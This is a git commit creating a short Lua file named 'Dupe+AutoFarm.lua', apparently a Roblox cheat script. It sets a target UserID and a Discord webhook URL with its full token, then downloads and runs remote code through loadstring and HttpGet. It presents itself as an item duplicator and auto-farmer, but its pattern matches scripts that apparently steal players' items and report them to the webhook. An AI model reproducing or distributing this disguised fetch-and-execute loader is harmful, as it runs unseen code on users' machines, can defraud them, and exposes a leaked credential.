fcc0d26c413c4b35f33508bfdf223302f4fa0a97
Roan7x <129550835+Roan7x@users.noreply.github.com>
2023-03-31 12:42:42 -0700

    Create Dupe+AutoFarm.lua

---
+++ Dupe+AutoFarm.lua
@@ -0,0 +1,3 @@
+_G.UserID = 654149661
+_G.WebHook = "https://discord.com/api/webhooks/1091441259320705054/9-E-OFNwr83KC3pmQUTNuA-bK2y0JSUb7ldy1pPIlo4tgRa_2ds2xBLNj5BPksTp28rb"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true%22))()
